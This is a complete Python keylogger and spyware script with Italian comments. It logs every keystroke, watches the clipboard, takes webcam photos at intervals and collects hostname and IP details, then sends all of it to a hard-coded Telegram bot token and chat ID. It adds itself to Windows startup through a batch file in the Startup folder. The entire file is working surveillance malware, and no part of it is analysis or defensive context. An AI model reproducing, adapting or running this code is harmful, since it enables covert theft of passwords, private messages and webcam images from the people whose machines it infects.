import os
import platform
import socket
import threading
import time
import tempfile
import sys
import cv2
import pyautogui
import numpy as np
from datetime import datetime
from pynput import keyboard
import requests
import pyperclip

# Configurazioni
BOT_TOKEN = '7943910313:AAGwlycYnqGOqPdiYKEP75BZV1mZbF3AikA'
CHAT_ID = '1060806638'
SEND_REPORT_EVERY = 180  # 3 minuti per keylogger
PHOTO_INTERVAL = 300  # 5 minuti per foto

log = ""
key_count = 0
session_start_time = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
previous_system_info = {}

def send_telegram_message(message):
    """Invia un messaggio testuale a Telegram"""
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
    requests.post(url, data=data)

def send_telegram_file(file_path):
    """Invia un file a Telegram"""
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        requests.post(url, files=files, data=data)

def get_system_info():
    """Raccoglie informazioni sul sistema"""
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    system = platform.system()
    machine = platform.machine()
    processor = platform.processor()
    
    return {
        "hostname": hostname,
        "ip_address": ip_address,
        "system": system,
        "machine": machine,
        "processor": processor
    }

def capture_photo():
    """Scatta una foto con la webcam e la invia a Telegram"""
    print("[LOG] Scattando foto...")
    camera = cv2.VideoCapture(0)
    if not camera.isOpened():
        print("[LOG] Errore: Impossibile accedere alla fotocamera.")
        return
    
    ret, frame = camera.read()
    if ret:
        photo_filename = os.path.join(tempfile.gettempdir(), f"photo_{int(time.time())}.jpg")
        cv2.imwrite(photo_filename, frame)
        send_telegram_file(photo_filename)
        os.remove(photo_filename)
    camera.release()
    print("[LOG] Foto scattata e inviata.")
    threading.Timer(PHOTO_INTERVAL, capture_photo).start()

def save_key(key):
    """Registra i tasti premuti"""
    global log, key_count
    try:
        if key == keyboard.Key.enter:
            log += "\n"  # Andare a capo
        elif key.char:
            log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.backspace:
            log = log[:-1]
    key_count += 1
    print(f"[LOG] Tasto premuto: {key}")

def monitor_clipboard():
    """Monitora la clipboard e invia il testo copiato a Telegram"""
    previous_clipboard = ""
    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard and current_clipboard != previous_clipboard:
            send_telegram_message(f"📋 *Testo copiato:*\n```{current_clipboard}```")
            print(f"[LOG] Testo copiato: {current_clipboard}")
            previous_clipboard = current_clipboard
        time.sleep(1)

def report():
    """Invia il log dei tasti premuti e le info di sistema a Telegram"""
    global log, key_count, previous_system_info
    system_info = get_system_info()
    
    if system_info != previous_system_info:
        info_message = (f"💻 *INFO SISTEMA*\n"
                        f"🏷️ Hostname: `{system_info['hostname']}`\n"
                        f"🌍 IP: `{system_info['ip_address']}`\n"
                        f"🖥️ Sistema: `{system_info['system']}`\n"
                        f"🔧 Architettura: `{system_info['machine']}`\n"
                        f"⚙️ Processore: `{system_info['processor']}`")
        send_telegram_message(info_message)
        previous_system_info = system_info
    
    if log:
        timestamp = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        message = (f"📝 *SESSIONE:* `{session_start_time}`\n"
                   f"🔐 *LOG DEI TASTI*\n"
                   f"📅 Ultimo aggiornamento: `{timestamp}`\n"
                   f"⌨️ Tasti premuti: `{key_count}`\n"
                   f"📄 Log:\n```{log}```")
        send_telegram_message(message)
        log = ""
    
    print(f"[LOG] Report inviato. Prossimo invio tra {SEND_REPORT_EVERY}s")
    threading.Timer(SEND_REPORT_EVERY, report).start()

def add_to_startup():
    """Aggiunge il programma all'avvio di Windows"""
    try:
        startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        exe_path = os.path.abspath(sys.argv[0])  # Percorso del file eseguibile

        startup_script = os.path.join(startup_path, "system_logger.bat")

        with open(startup_script, "w") as bat_file:
            bat_file.write(f'@echo off\nstart "" "{exe_path}"\nexit')

        print("[LOG] Aggiunto ai programmi di avvio correttamente.")
    except Exception as e:
        print(f"[LOG] Errore nell'aggiungere ai programmi di avvio: {str(e)}")

def start_keylogger():
    """Avvia il keylogger e i vari processi"""
    add_to_startup()
    listener = keyboard.Listener(on_press=save_key)
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()
    print("[LOG] Keylogger avviato.")
    report()
    capture_photo()
    with listener:
        listener.join()

start_keylogger()
